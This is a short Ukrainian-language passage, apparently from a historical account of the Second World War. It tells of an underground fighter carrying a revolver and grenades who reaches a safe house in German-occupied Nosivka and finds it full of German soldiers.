<p>Пробравшись у зайняту гітлерівцями Носівку, він прийшов на явочну квартиру Ганни Труніної. Із зброї він мав при собі револьвер і декілька гранат. Але коли зайшов на подвір'я, побачив, що в хаті багато німців. Тікати вже було пізно, бо на нього окупанти звернули увагу. При обшуку у його б знайшли зброю і кінець операції був би для нього трагічним.</p>
